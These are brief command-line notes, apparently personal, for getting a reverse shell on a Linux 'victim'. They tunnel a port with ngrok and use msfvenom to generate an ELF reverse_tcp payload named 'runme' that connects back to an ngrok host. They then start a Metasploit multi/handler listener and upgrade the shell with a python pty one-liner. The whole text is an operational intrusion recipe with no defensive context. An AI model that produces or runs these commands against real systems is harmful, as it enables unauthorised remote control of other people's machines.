./ngrok tcp 443

msfvenom --platform linux -p linux/x64/shell/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=17462 -b "\x00" -f elf > ~/Desktop/runme
^LHOST and LPORT are the ip/port you want the victim to connect to (in this case, ngrok's)

chmod 755 ~/Desktop/runme

msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/shell/reverse_tcp; set LHOST 127.0.0.1; set LPORT 443; run; exit -y"
^LHOST and LPORT are the ip/port you want to expose on your machine to listen (for ngrok, just use localhost)

python -c "import pty; pty.spawn('/bin/bash');"